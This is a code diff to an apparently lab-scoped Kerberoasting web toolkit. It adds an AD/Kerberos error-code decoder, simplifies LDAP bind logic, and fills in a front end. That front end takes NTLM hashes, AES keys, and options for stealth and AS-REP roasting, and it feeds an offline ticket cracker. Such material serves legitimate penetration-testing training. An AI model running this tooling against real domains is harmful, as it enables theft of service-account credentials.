@@ -77,6 +77,71 @@ except Exception as _e:  # noqa: BLE001
     IMPORT_ERROR = str(_e)
 
 
+# ---------------------------------------------------------------------------
+#  Friendly decoding of AD LDAP-bind / Kerberos error sub-codes.
+#  AD packs the real reason into "... data <code> ..." on an invalidCredentials
+#  (8009030C) bind, and into KDC_ERR_* strings on Kerberos failures.
+# ---------------------------------------------------------------------------
+_AD_DATA_CODES = {
+    "525": "the user does not exist",
+    "52e": "invalid credentials - wrong username or password",
+    "52f": "account restriction (e.g. a blank password where one is required)",
+    "530": "not permitted to log on at this time",
+    "531": "not permitted to log on at this workstation",
+    "532": "the password has expired",
+    "533": "the account is disabled",
+    "568": "too many context IDs",
+    "701": "the account has expired",
+    "773": "the user must reset their password before logging on",
+    "775": "the account is locked out",
+}
+_KRB_CODES = {
+    "KDC_ERR_PREAUTH_FAILED": "wrong password / key (pre-auth failed)",
+    "KDC_ERR_C_PRINCIPAL_UNKNOWN": "the user/principal does not exist",
+    "KDC_ERR_S_PRINCIPAL_UNKNOWN": "the requested SPN/service does not exist",
+    "KDC_ERR_KEY_EXPIRED": "the password has expired",
+    "KRB_AP_ERR_SKEW": "clock skew too great - sync this host's time with the DC",
+    "KDC_ERR_ETYPE_NOSUPP": "no supported Kerberos encryption type",
+    "KDC_ERR_WRONG_REALM": "wrong realm/domain for this principal",
+    "KDC_ERR_PREAUTH_REQUIRED": "pre-authentication is required for this account",
+}
+_REMEDIATION = {
+    "52e": "Use the FQDN domain (e.g. lab.local, not LAB), and double-check the username and password "
+           "for typos / caps-lock. AD returns this same code for a wrong password AND a missing user.",
+    "525": "Confirm the sAMAccountName and the domain are correct.",
+    "532": "The password is expired - reset it, or use -k with a fresh ticket.",
+    "533": "Enable the account or use a different one.",
+    "775": "The account is locked out - wait for the lockout window or unlock it.",
+    "KRB_AP_ERR_SKEW": "Sync your clock to the DC (ntpdate / w32tm); Kerberos allows only ~5 minutes of skew.",
+}
+
+
+def _decode_ad_hint(text):
+    """Turn an AD 'data 52e' / KDC_ERR_* message into a plain-English hint."""
+    if not text:
+        return None
+    parts = []
+    key = None
+    m = re.search(r"data\s+([0-9a-fA-F]{3,4})", text)
+    if m:
+        code = m.group(1).lower()
+        desc = _AD_DATA_CODES.get(code)
+        if desc:
+            parts.append("LDAP bind failed (data %s): %s." % (code, desc))
+            key = code
+    for k, v in _KRB_CODES.items():
+        if k in text:
+            parts.append("Kerberos error %s: %s." % (k, v))
+            key = key or k
+            break
+    if not parts:
+        return None
+    rem = _REMEDIATION.get(key)
+    if rem:
+        parts.append(rem)
+    return " ".join(parts)
+
+
 # ===========================================================================
 #  STAGE 1 ENGINE  --  Recon: IP -> Domain + AD port sweep (read-only)
 # ===========================================================================
@@ -173,7 +238,7 @@ def run_recon(ip):
         # AD port sweep (pure sockets - works with or without impacket).
         data["ports"] = scan_ports(ip)
         port_open = {p["port"]: p["open"] for p in data["ports"]}
-        n_open = sum(1 for p in data["ports"] if p["open"]) 
+        n_open = sum(1 for p in data["ports"] if p["open"])
         logging.info("Port sweep: %d/%d AD ports open on %s" % (n_open, len(data["ports"]), ip))
 
         # SMB domain discovery only if impacket is present and 445 is open.
@@ -184,7 +249,7 @@ def run_recon(ip):
                     if info.get(k):
                         data[k] = info[k]
                 if data["domain"]:
-                    logging.info("Domain discovered: %s" % data["domain"]) 
+                    logging.info("Domain discovered: %s" % data["domain"])
             except Exception as e:
                 logging.warning("SMB discovery failed: %s" % str(e))
         elif not IMPACKET_OK:
@@ -202,6 +267,8 @@ def run_recon(ip):
     finally:
         out["log"] = handler.records
         root.removeHandler(handler)
+    _blob = " ".join([out.get("error") or ""] + [r.get("message", "") for r in out["log"]])
+    out["hint"] = _decode_ad_hint(_blob)
     return out
 
 
@@ -372,76 +439,11 @@ class GetUserSPNs(object):
             self.request_users_file_TGSs()
             return
 
-        # Try ldap_login and fall back to common principal formats if the first bind fails
-        try:
-            ldapConnection = ldap_login(
-                self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
-                self.__doKerberos, self.__username, self.__password, self.__domain,
-                self.__lmhash, self.__nthash, self.__aesKey,
-                target_domain=self.__targetDomain, fqdn=True)
-        except Exception as e:
-            err = str(e) or ''
-            # If the error looks like invalid credentials, try a few alternative username formats
-            if any(x in err.lower() for x in ("invalid", "acceptsecuritycontext", "data 52e", "invalidcredentials")):
-                tried = []
-                candidates = []
-                uname = (self.__username or "").strip()
-                # If username is empty, nothing to retry
-                if uname:
-                    candidates.append(uname)
-                    # domain\user
-                    if "\\" not in uname and self.__domain:
-                        candidates.append(self.__domain + "\\" + uname)
-                    # user@domain
-                    if "@" not in uname and self.__domain:
-                        candidates.append(uname + "@" + self.__domain)
-                    # Common DN guesses under Users container
-                    if self.baseDN:
-                        users_dn = 'CN=Users,' + self.baseDN
-                        candidates.append(f'CN={uname},{users_dn}')
-                        candidates.append(f'cn={uname},{users_dn}')
-                        # Try sAMAccountName-based DNless bind as enterprise principal
-                        candidates.append(uname)
-                # Deduplicate while preserving order
-                for c in candidates:
-                    if c and c not in tried:
-                        tried.append(c)
-                ldapConnection = None
-                last_exc = e
-                # Also consider trying with hashes / AES key when password is empty
-                try_hash_bind = (not self.__password) and (self.__lmhash or self.__nthash or self.__aesKey)
-                for cand in tried:
-                    logging.info("LDAP bind failed with %r; retrying with principal %s" % (err, cand))
-                    try:
-                        ldapConnection = ldap_login(
-                            self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
-                            self.__doKerberos, cand, self.__password, self.__domain,
-                            self.__lmhash, self.__nthash, self.__aesKey,
-                            target_domain=self.__targetDomain, fqdn=True)
-                        last_exc = None
-                        break
-                    except Exception as e2:
-                        last_exc = e2
-                # If initial retries failed and hash/aes are available, try binding with empty password but hashes/aes
-                if last_exc is not None and try_hash_bind:
-                    for cand in tried:
-                        logging.info("Retrying LDAP bind using hash/AES auth with principal %s" % (cand,))
-                        try:
-                            ldapConnection = ldap_login(
-                                self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
-                                self.__doKerberos, cand, '', self.__domain,
-                                self.__lmhash, self.__nthash, self.__aesKey,
-                                target_domain=self.__targetDomain, fqdn=True)
-                            last_exc = None
-                            break
-                        except Exception as e3:
-                            last_exc = e3
-                if last_exc is not None:
-                    # re-raise the last exception (preserve original message when available)
-                    logging.error("LDAP bind retries failed: %s" % (str(last_exc) or last_exc.__class__.__name__))
-                    raise last_exc
-            else:
-                raise
+        ldapConnection = ldap_login(
+            self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
+            self.__doKerberos, self.__username, self.__password, self.__domain,
+            self.__lmhash, self.__nthash, self.__aesKey,
+            target_domain=self.__targetDomain, fqdn=True)
         self.__target = ldapConnection._dstHost
 
         filter_spn = "servicePrincipalName=*"
@@ -570,7 +572,7 @@ class GetUserSPNs(object):
                     no_preauth_principal = Principal(
                         self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                     tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
-                        clientName=no_preauth_principal, ******
+                        clientName=no_preauth_principal, password=self.__password,
                         domain=self.__domain, lmhash=(self.__lmhash), nthash=(self.__nthash),
                         aesKey=self.__aesKey, kdcHost=self.__kdcHost,
                         serverName=username, kerberoast_no_preauth=True)
@@ -664,10 +666,12 @@ def run_kerberoast(params):
         payload["log"] = handler.records
         root.removeHandler(handler)
         root.setLevel(prev_level)
+    _blob = " ".join([payload.get("error") or ""] + [r.get("message", "") for r in payload["log"]])
+    payload["hint"] = _decode_ad_hint(_blob)
     return payload
 
 
-# ==========================================================================
+# ===========================================================================
 #  STAGE 2b ENGINE  --  Offline dictionary crack of roasted hashes (by user)
 #
 #  Pure-Python RC4-HMAC (etype 23) cracker: for each candidate password we
@@ -675,7 +679,7 @@ def run_kerberoast(params):
 #  means the password matched. This ONLY recovers weak service-account
 #  passwords - which is exactly the weakness Kerberoasting demonstrates.
 #  AES tickets (17/18) need a per-principal salt; export them and use hashcat.
-# ==========================================================================
+# ===========================================================================
 
 _KRB5TGS_RE = re.compile(r"^\$krb5tgs\$(\d+)\$(.*)\$([0-9a-fA-F]+)\$([0-9a-fA-F]+)\s*$", re.S)
 
@@ -789,9 +793,9 @@ def _crack_worker(job_id, hashes, wordlist_text, wordlist_path, cap):
             j["progress"] = {"tried": result["tried"], "found": len(result["cracked"])}
 
 
-# ==========================================================================
+# ===========================================================================
 #  FRONT-END  (served without Jinja; only the import banner is substituted)
-# ==========================================================================
+# ===========================================================================
 
 PAGE_HTML = r"""<!DOCTYPE html>
 <html lang="en">
@@ -799,13 +803,756 @@ PAGE_HTML = r"""<!DOCTYPE html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Kerberos Kill Chain - Lab Toolkit</title>
-... (HTML omitted in this listing to keep the file entry compact) ...
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@600;700;800&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<style>
+  :root{
+    --bg:#0d1117; --surface:#161c24; --surface-2:#1d2530; --inset:#12171f;
+    --line:#28313d; --line-2:#333e4c;
+    --ink:#e9eef5; --muted:#98a5b4; --faint:#6d7986;
+    --gold:#f0c559; --gold-dim:#c79a34; --gold-bg:rgba(240,197,89,.10); --gold-line:rgba(240,197,89,.4);
+    --red:#f0655c; --red-bg:rgba(240,101,92,.11); --red-line:rgba(240,101,92,.4);
+    --teal:#33cbb8; --teal-bg:rgba(51,203,184,.10); --teal-line:rgba(51,203,184,.38);
+    --mono:'IBM Plex Mono',ui-monospace,'SFMono-Regular',Menlo,Consolas,monospace;
+    --sans:'IBM Plex Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+    --disp:'Archivo',var(--sans);
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+       font-size:14px;line-height:1.55;-webkit-font-smoothing:antialiased}
+  a{color:var(--gold)}
+  .wrap{max-width:1160px;margin:0 auto;padding:24px 22px 64px}
+
+  header.top{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+  .logo{width:40px;height:40px;border-radius:10px;flex:0 0 auto;font-size:21px;
+        background:linear-gradient(150deg,#3a2f12,#191008);border:1px solid var(--gold-line);
+        display:flex;align-items:center;justify-content:center}
+  .eyebrow{font-family:var(--mono);font-size:10.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--gold-dim);margin:0 0 3px}
+  h1{font-family:var(--disp);font-weight:800;font-size:22px;margin:0;letter-spacing:-.01em}
+  .sub{color:var(--muted);font-size:12.5px}
+
+  .scope{display:flex;align-items:center;gap:11px;margin:18px 0 4px;padding:10px 15px;
+         background:var(--red-bg);border:1px solid var(--red-line);border-radius:10px;font-size:12.5px}
+  .scope .k{font-family:var(--mono);font-size:10.5px;font-weight:600;letter-spacing:.12em;
+            text-transform:uppercase;color:var(--red);white-space:nowrap}
+  .scope span{color:var(--muted)}
+  .scope b{color:var(--ink)}
+  .banner.err{margin:16px 0 0;padding:10px 14px;border-radius:9px;font-size:12.5px;
+              background:var(--red-bg);border:1px solid var(--red-line);color:#ffc4c0}
+
+  /* tabs */
+  .tabs{display:flex;gap:4px;margin:22px 0 20px;border-bottom:1px solid var(--line)}
+  .tab{font-family:var(--sans);font-size:13.5px;font-weight:500;color:var(--muted);
+       background:transparent;border:0;border-bottom:2px solid transparent;
+       padding:11px 16px;cursor:pointer;display:flex;align-items:center;gap:8px;margin-bottom:-1px}
+  .tab:hover{color:var(--ink)}
+  .tab.active{color:var(--ink);border-bottom-color:var(--gold)}
+  .tab .n{font-family:var(--mono);font-size:11px;color:var(--gold-dim)}
+  .tab.active .n{color:var(--gold)}
+  .panel{display:none} .panel.active{display:block}
+
+  .card{background:var(--surface);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+  .card > h2{font-size:11.5px;text-transform:uppercase;letter-spacing:.9px;color:var(--muted);
+             margin:0;padding:13px 16px;border-bottom:1px solid var(--line);background:var(--surface-2)}
+  .card .body{padding:16px}
+
+  label.lab{display:block;font-size:12px;color:var(--muted);margin-bottom:5px}
+  label.lab .flag{font-family:var(--mono);font-size:11px;color:var(--faint)}
+  input[type=text],input[type=password],textarea{
+    width:100%;background:var(--inset);border:1px solid var(--line);color:var(--ink);
+    border-radius:8px;padding:9px 11px;font-size:13px;font-family:var(--sans);outline:none}
+  input::placeholder,textarea::placeholder{color:#495563}
+  input:focus,textarea:focus{border-color:var(--gold-line);box-shadow:0 0 0 3px var(--gold-bg)}
+  textarea{resize:vertical;min-height:66px;font-family:var(--mono);font-size:12px}
+
+  button.run{background:var(--gold);color:#231a05;border:0;border-radius:9px;
+             padding:11px 20px;font-size:14px;font-weight:600;cursor:pointer;font-family:var(--sans);
+             display:inline-flex;align-items:center;gap:9px}
+  button.run:hover{background:#f3ce72}
+  button.run:disabled{opacity:.55;cursor:not-allowed}
+  button.ghost{background:transparent;color:var(--muted);border:1px solid var(--line);
+               border-radius:8px;padding:9px 14px;font-size:12.5px;cursor:pointer;font-family:var(--sans)}
+  button.ghost:hover{color:var(--ink);border-color:var(--line-2)}
+  .spin{width:15px;height:15px;border:2px solid rgba(0,0,0,.3);border-top-color:#231a05;
+        border-radius:50%;animation:sp .7s linear infinite;display:none}
+  @keyframes sp{to{transform:rotate(360deg)}}
+
+  /* ---- RECON tab ---- */
+  .recon-wrap{max-width:720px}
+  .recon-row{display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap}
+  .recon-row .grow{flex:1 1 260px}
+  .recon-note{color:var(--faint);font-size:12px;margin:12px 0 0;line-height:1.55}
+  .kv{display:grid;grid-template-columns:150px 1fr;gap:1px;background:var(--line);
+      border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-top:16px}
+  .kv .k,.kv .v{background:var(--surface);padding:10px 13px}
+  .kv .k{color:var(--muted);font-size:12px}
+  .kv .v{font-family:var(--mono);font-size:12.5px;color:var(--ink);word-break:break-all}
+  .kv .v.gold{color:var(--gold)}
+  .recon-status{display:flex;align-items:center;gap:9px;font-size:12.5px;color:var(--muted);margin-top:14px}
+  .dot{width:9px;height:9px;border-radius:50%;background:var(--faint)}
+  .dot.run{background:var(--gold);animation:pulse 1s infinite}
+  .dot.ok{background:var(--teal)} .dot.err{background:var(--red)}
+  @keyframes pulse{50%{opacity:.35}}
+  .ports{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:8px}
+  .port{display:flex;align-items:center;gap:9px;padding:8px 11px;border:1px solid var(--line);border-radius:8px;background:var(--inset);font-size:12px}
+  .port .pd{width:8px;height:8px;border-radius:50%;background:var(--faint);flex:0 0 auto}
+  .port.open{border-color:var(--teal-line)}
+  .port.open .pd{background:var(--teal)}
+  .port .pp{font-family:var(--mono);color:var(--muted)}
+  .port.open .pp{color:var(--teal)}
+  .port .ps{margin-left:auto;color:var(--faint);font-size:10.5px;text-align:right}
+  .kv .v.teal{color:var(--teal)}
+
+  /* ---- KERBEROAST tab ---- */
+  .grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.25fr);gap:20px}
+  @media(max-width:900px){.grid{grid-template-columns:1fr}}
+  .fset{margin:0 0 18px;padding:0;border:0}
+  .fset:last-child{margin-bottom:0}
+  .fset > legend{font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--faint);padding:0;margin:0 0 10px;font-weight:600}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  @media(max-width:520px){.row{grid-template-columns:1fr}}
+  .field{margin-bottom:12px}.field:last-child{margin-bottom:0}
+  .checks{display:grid;grid-template-columns:1fr 1fr;gap:8px 14px}
+  @media(max-width:520px){.checks{grid-template-columns:1fr}}
+  .chk{display:flex;align-items:flex-start;gap:8px;font-size:12.5px;cursor:pointer;padding:6px 8px;border-radius:7px;border:1px solid transparent}
+  .chk:hover{background:var(--surface-2)}
+  .chk input{margin-top:2px;accent-color:var(--gold);width:15px;height:15px;flex:0 0 auto}
+  .chk .cx{display:flex;flex-direction:column}
+  .chk .cx .flag{font-family:var(--mono);font-size:10.5px;color:var(--faint)}
+  .actions{display:flex;gap:10px;align-items:center;margin-top:4px}
+  .elapsed{font-family:var(--mono);font-size:12px;color:var(--muted)}
+  .status{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--muted);padding:2px 0 14px}
+  .empty{color:var(--faint);font-size:13px;text-align:center;padding:36px 10px}
+  .empty svg{opacity:.35;margin-bottom:10px}
+  .sec{margin-bottom:20px}.sec:last-child{margin-bottom:0}
+  .sec-h{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:9px}
+  .sec-h h3{font-size:11.5px;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);margin:0}
+  .pill{font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--line);border-radius:20px;padding:2px 9px}
+  .tblwrap{overflow-x:auto;border:1px solid var(--line);border-radius:9px}
+  table{border-collapse:collapse;width:100%;font-size:12.5px;min-width:640px}
+  th{position:sticky;top:0;text-align:left;background:var(--surface-2);color:var(--muted);font-weight:600;
+     font-size:11px;text-transform:uppercase;letter-spacing:.5px;padding:9px 11px;border-bottom:1px solid var(--line);white-space:nowrap}
+  td{padding:8px 11px;border-bottom:1px solid #1f2731;vertical-align:top}
+  tr:last-child td{border-bottom:0}
+  tr:hover td{background:var(--gold-bg)}
+  td.spn{font-family:var(--mono);color:var(--gold);word-break:break-all}
+  td.name{font-family:var(--mono);color:var(--ink)}
+  td.mono{font-family:var(--mono);color:var(--muted);white-space:nowrap}
+  .tag{font-family:var(--mono);font-size:11px;padding:1px 7px;border-radius:5px}
+  .tag.unc{background:var(--red-bg);color:#ff9d97;border:1px solid var(--red-line)}
+  .tag.con{background:var(--gold-bg);color:var(--gold);border:1px solid var(--gold-line)}
+  .hashbox{background:var(--inset);border:1px solid var(--line);border-radius:9px;padding:12px;font-family:var(--mono);font-size:12px;max-height:320px;overflow:auto}
+  .hashbox .h{color:#c9d5e3;word-break:break-all;padding:3px 0;border-bottom:1px dashed #1b222b}
+  .hashbox .h:last-child{border-bottom:0}
+  .hashbox .h .et{color:var(--gold)}
+  .btnrow{display:flex;gap:8px;flex-wrap:wrap}
+  .logbox{background:var(--inset);border:1px solid var(--line);border-radius:9px;padding:10px 12px;font-family:var(--mono);font-size:11.5px;max-height:200px;overflow:auto}
+  .logbox .l{padding:2px 0;white-space:pre-wrap;word-break:break-word}
+  .l .lv{display:inline-block;min-width:62px;color:var(--faint)}
+  .l.ERROR .lv,.l.CRITICAL .lv{color:var(--red)}
+  .l.WARNING .lv{color:var(--gold)}
+  .l.INFO .lv{color:var(--teal)}
+  .errbox{background:var(--red-bg);border:1px solid var(--red-line);color:#ffc4c0;border-radius:9px;padding:12px 14px;font-size:13px;font-family:var(--mono)}
+  .hintbox{margin-top:8px;background:var(--teal-bg);border:1px solid var(--teal-line);color:var(--ink);border-radius:9px;padding:10px 13px;font-size:12.5px;line-height:1.55}
+  .hintbox b{color:var(--teal)}
+  .toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(20px);
+         background:#22303f;color:var(--ink);border:1px solid #34506e;border-radius:9px;padding:10px 16px;font-size:13px;opacity:0;pointer-events:none;transition:.25s}
+  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+  /* ---- CHAIN tab ---- */
+  .chain-wrap{max-width:920px}
+  .figwrap{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:20px 18px 10px;overflow-x:auto}
+  .diagram{display:block;width:100%;min-width:620px;height:auto;color:var(--ink)}
+  .diagram .region-pre{fill:var(--surface-2)}
+  .diagram .region-t0{fill:var(--gold-bg)}
+  .diagram .node{fill:var(--inset);stroke:var(--line-2);stroke-width:1.4}
+  .diagram .node-t0{fill:var(--inset);stroke:var(--gold-line);stroke-width:1.6}
+  .diagram .nlabel{fill:var(--ink);font-family:var(--mono);font-size:13px;font-weight:600}
+  .diagram .nlabel-t0{fill:var(--gold)}
+  .diagram .nsub{fill:var(--faint);font-family:var(--mono);font-size:10px}
+  .diagram .edge{stroke:var(--ink);stroke-width:1.6;fill:none;opacity:.55}
+  .diagram .edge-danger{stroke:var(--red);stroke-width:2;fill:none;stroke-dasharray:6 4}
+  .diagram .elabel{fill:var(--muted);font-family:var(--mono);font-size:10.5px}
+  .diagram .elabel-d{fill:var(--red);font-family:var(--mono);font-size:10.5px;font-weight:600}
+  .diagram .regtitle{fill:var(--faint);font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.15em}
+  .diagram .boundary{stroke:var(--red);stroke-width:1.6;stroke-dasharray:3 4;opacity:.85}
+  .diagram .btext{fill:var(--red);font-family:var(--mono);font-size:9.5px;font-weight:600;letter-spacing:.13em}
+  .diagram .ahead{fill:var(--ink);opacity:.55}
+  .diagram .ahead-d{fill:var(--red)}
+  .figcap{font-size:12.5px;color:var(--muted);margin:12px 4px 0;line-height:1.5}
+  .figcap b{color:var(--ink)}
+  .stage{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:20px;margin-top:16px}
+  .st-head{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}
+  .st-num{font-family:var(--mono);font-size:12px;font-weight:600;color:var(--gold);border:1px solid var(--gold-line);border-radius:6px;padding:2px 8px}
+  .st-name{font-family:var(--disp);font-weight:700;font-size:16px;margin:0;flex:1 1 auto}
+  .chip{font-family:var(--mono);font-size:10.5px;padding:3px 9px;border-radius:20px;white-space:nowrap}
+  .chip.att{color:var(--muted);background:var(--surface-2);border:1px solid var(--line)}
+  .chip.z0{color:var(--muted);background:var(--surface-2);border:1px solid var(--line)}
+  .chip.zt{color:var(--gold);background:var(--gold-bg);border:1px solid var(--gold-line)}
+  .st-mech{margin:13px 0 0;font-size:13.5px;line-height:1.6;color:var(--ink)}
+  .st-mech .term{font-family:var(--mono);font-size:.9em;background:var(--surface-2);padding:1px 5px;border-radius:4px}
+  .cmd{margin:13px 0 0;background:var(--inset);border:1px solid var(--line);border-radius:9px;overflow:hidden}
+  .cmd-tab{padding:7px 13px;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:10px;letter-spacing:.13em;text-transform:uppercase}
+  .cmd-tab .off{color:var(--red);font-weight:600}
+  .cmd-tab .tool{color:var(--faint)}
+  .cmd pre{margin:0;padding:12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.65}
+  .cmd .p{color:var(--faint)} .cmd .fl{color:var(--gold)} .cmd .cm{color:var(--faint)}
+  .yield{display:flex;gap:9px;margin:12px 0 0;font-size:12.5px;color:var(--muted)}
+  .yield .arw{color:var(--gold);font-family:var(--mono);font-weight:600}
+  .yield b{color:var(--ink);font-family:var(--mono);font-size:12px}
+  .defend{margin:15px 0 0;background:var(--teal-bg);border:1px solid var(--teal-line);border-radius:9px;padding:12px 15px}
+  .defend .dh{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.13em;text-transform:uppercase;color:var(--teal);margin-bottom:7px}
+  .defend .dh svg{width:13px;height:13px;stroke:var(--teal);fill:none}
+  .defend p{margin:0;font-size:12.5px;line-height:1.55;color:var(--ink)}
+  .defend .evt{font-family:var(--mono);font-size:.85em;color:var(--teal);font-weight:600}
+  .chain-note{margin-top:18px;padding:12px 15px;border:1px dashed var(--line-2);border-radius:9px;color:var(--muted);font-size:12.5px;line-height:1.55}
+
+  footer{margin-top:28px;color:var(--faint);font-size:11.5px;text-align:center;line-height:1.7}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="top">
+    <div class="logo">&#127915;</div>
+    <div>
+      <p class="eyebrow">Active Directory &middot; Lab Toolkit</p>
+      <h1>Kerberos Kill Chain</h1>
+    </div>
+  </header>
+
+  %%IMPORT_ERROR_BANNER%%
+
+  <div class="scope">
+    <span class="k">Lab only</span>
+    <span><b>Recon</b> and <b>Kerberoast</b> below execute against the target you point them at; run them only on a
+    lab you own (GOAD, a home AD) or an authorized engagement. The <b>Attack chain</b> tab documents the tier-0
+    tail (DCSync, Golden Ticket) as reference, not automation. Keep this server on <b>127.0.0.1</b>.</span>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" data-tab="recon"><span class="n">01</span> Recon</button>
+    <button class="tab" data-tab="roast"><span class="n">02</span> Kerberoast</button>
+    <button class="tab" data-tab="chain">Attack chain</button>
+  </div>
+
+  <!-- =============== RECON =============== -->
+  <section class="panel active" id="panel-recon">
+    <div class="recon-wrap">
+      <div class="card">
+        <h2>Stage 1 &middot; Discover domain from a DC IP</h2>
+        <div class="body">
+          <div class="recon-row">
+            <div class="grow">
+              <label class="lab">DC IP or hostname <span class="flag">smb / rootDSE</span></label>
+              <input type="text" id="reconIp" placeholder="10.10.10.10" autocomplete="off">
+            </div>
+            <button class="run" id="reconBtn"><span class="spin" id="reconSpin"></span><span id="reconLabel">Discover</span></button>
+          </div>
+          <p class="recon-note">Read-only: reads the domain, baseDN and DC name straight out of the SMB
+            negotiation &mdash; no credentials, no writes. This is the <span style="color:var(--gold)">IP &rarr; Domain</span> hop.</p>
+
+          <div class="recon-status" id="reconStatus" style="display:none">
+            <span class="dot" id="reconDot"></span><span id="reconStatusText"></span>
+          </div>
+          <div id="reconOut" style="display:none">
+            <div class="kv">
+              <div class="k">Domain (FQDN)</div><div class="v gold" id="rv-domain">&mdash;</div>
+              <div class="k">baseDN</div><div class="v" id="rv-basedn">&mdash;</div>
+              <div class="k">DC host</div><div class="v" id="rv-host">&mdash;</div>
+              <div class="k">NetBIOS domain</div><div class="v" id="rv-nbdom">&mdash;</div>
+              <div class="k">NetBIOS name</div><div class="v" id="rv-nbname">&mdash;</div>
+              <div class="k">OS</div><div class="v" id="rv-os">&mdash;</div>
+            </div>
+            <div id="portsWrap" style="display:none;margin-top:18px">
+              <div class="sec-h"><h3>AD ports</h3><span class="pill" id="portsOpen">0 open</span></div>
+              <div class="ports" id="portsGrid"></div>
+            </div>
+            <div class="btnrow" style="margin-top:16px">
+              <button class="run" id="toRoast">Send to Kerberoast &rarr;</button>
+            </div>
+          </div>
+          <div id="reconErr" class="errbox" style="display:none;margin-top:16px"></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============== KERBEROAST =============== -->
+  <section class="panel" id="panel-roast">
+    <div class="grid">
+      <div class="card">
+        <h2>Stage 2 &middot; Kerberoast parameters</h2>
+        <div class="body">
+          <form id="form" autocomplete="off">
+            <fieldset class="fset">
+              <legend>Target &amp; identity</legend>
+              <div class="row">
+                <div class="field"><label class="lab">Domain <span class="flag">domain</span></label>
+                  <input type="text" name="user_domain" placeholder="lab.local" required></div>
+                <div class="field"><label class="lab">Target domain <span class="flag">-target-domain</span></label>
+                  <input type="text" name="target_domain" placeholder="(cross-trust, optional)"></div>
+              </div>
+              <div class="row">
+                <div class="field"><label class="lab">Username <span class="flag">username</span></label>
+                  <input type="text" name="username" placeholder="jdoe"></div>
+                <div class="field"><label class="lab">Password <span class="flag">password</span></label>
+                  <input type="password" name="password" placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;"></div>
+              </div>
+            </fieldset>
+            <fieldset class="fset">
+              <legend>Authentication</legend>
+              <div class="row">
+                <div class="field"><label class="lab">NTLM hashes <span class="flag">-hashes</span></label>
+                  <input type="text" name="hashes" placeholder="LMHASH:NTHASH"></div>
+                <div class="field"><label class="lab">AES key <span class="flag">-aesKey</span></label>
+                  <input type="text" name="aes_key" placeholder="128/256-bit hex"></div>
+              </div>
+              <div class="checks">
+                <label class="chk"><input type="checkbox" name="kerberos"><span class="cx">Use Kerberos / ccache<span class="flag">-k</span></span></label>
+                <label class="chk"><input type="checkbox" name="no_pass"><span class="cx">No password prompt<span class="flag">-no-pass</span></span></label>
+              </div>
+            </fieldset>
+            <fieldset class="fset">
+              <legend>Connection</legend>
+              <div class="row">
+                <div class="field"><label class="lab">DC IP <span class="flag">-dc-ip</span></label>
+                  <input type="text" name="dc_ip" placeholder="10.10.10.10"></div>
+                <div class="field"><label class="lab">DC hostname <span class="flag">-dc-host</span></label>
+                  <input type="text" name="dc_host" placeholder="dc01.lab.local"></div>
+              </div>
+            </fieldset>
+            <fieldset class="fset">
+              <legend>Roasting options</legend>
+              <div class="checks">
+                <label class="chk"><input type="checkbox" name="request" checked><span class="cx">Request TGS (roast)<span class="flag">-request</span></span></label>
+                <label class="chk"><input type="checkbox" name="machine_only"><span class="cx">Machine accounts only<span class="flag">-machine-only</span></span></label>
+                <label class="chk"><input type="checkbox" name="stealth"><span class="cx">Stealth (no SPN filter)<span class="flag">-stealth</span></span></label>
+                <label class="chk"><input type="checkbox" name="no_rc4"><span class="cx">Don't force RC4<span class="flag">-no-rc4</span></span></label>
+                <label class="chk"><input type="checkbox" name="save"><span class="cx">Save .ccache<span class="flag">-save</span></span></label>
+                <label class="chk"><input type="checkbox" name="debug"><span class="cx">Debug logging<span class="flag">-debug</span></span></label>
+              </div>
+              <div class="row" style="margin-top:12px">
+                <div class="field"><label class="lab">Request user <span class="flag">-request-user</span></label>
+                  <input type="text" name="request_user" placeholder="single sAMAccountName"></div>
+                <div class="field"><label class="lab">Request machine <span class="flag">-request-machine</span></label>
+                  <input type="text" name="request_machine" placeholder="workstation01$"></div>
+              </div>
+              <div class="field" style="margin-top:2px"><label class="lab">No-preauth account <span class="flag">-no-preauth</span></label>
+                <input type="text" name="no_preauth" placeholder="AS-REP roast account"></div>
+              <div class="field"><label class="lab">Users list <span class="flag">-usersfile</span> &mdash; one per line (required with -no-preauth)</label>
